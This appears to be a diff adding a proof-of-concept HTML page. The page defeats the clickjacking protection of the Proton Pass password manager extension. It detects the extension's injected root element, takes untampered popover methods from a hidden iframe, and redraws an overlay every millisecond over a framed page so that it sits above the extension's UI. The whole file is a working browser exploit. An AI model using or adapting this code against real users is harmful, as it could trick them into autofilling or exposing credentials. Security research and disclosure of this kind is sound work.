@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>PoC</title>
+</head>
+<body>
+    <h1>PoC</h1>
+    <dialog id="iframeDialog">
+        <iframe src="clickjacking-evasion-iframe.html" style="width: 800px; height: 600px;"></iframe>
+    </dialog>
+
+    <div popover="manual" id="attackPopover" style="
+        width: 1000px;
+        height: 1000px;
+        background: rgba(0, 255, 0, 0.301);
+        border: none;
+        pointer-events: none;
+    "></div>
+
+    <script>
+        const dialog = document.getElementById('iframeDialog');
+        dialog.showModal();
+        
+        let refreshInterval = null;
+        const attackPopover = document.getElementById('attackPopover');
+
+        const observer = new MutationObserver((mutations) => {
+            mutations.forEach((mutation) => {
+                mutation.addedNodes.forEach((node) => {
+                    const isProtonPassRoot = node.nodeType === Node.ELEMENT_NODE && (
+                        node.tagName?.toLowerCase().startsWith('protonpass-root')
+                    );
+                    if (isProtonPassRoot) {
+                        setTimeout(() => {
+                            const hiddenFrame = document.createElement('iframe');
+                            hiddenFrame.style.display = 'none';
+                            document.body.appendChild(hiddenFrame);
+                            const cleanShowPopover = hiddenFrame.contentWindow.HTMLElement.prototype.showPopover;
+                            const cleanHidePopover = hiddenFrame.contentWindow.HTMLElement.prototype.hidePopover;
+                            cleanShowPopover.call(attackPopover);
+                            if (refreshInterval) clearInterval(refreshInterval);
+                            refreshInterval = setInterval(() => {
+                                cleanHidePopover.call(attackPopover);
+                                cleanShowPopover.call(attackPopover);
+                            }, 1);
+                        }, 2);
+                    }
+                });
+            });
+        });
+        
+        observer.observe(document.body, { childList: true, subtree: true });
+    </script>
+</body>
+</html>
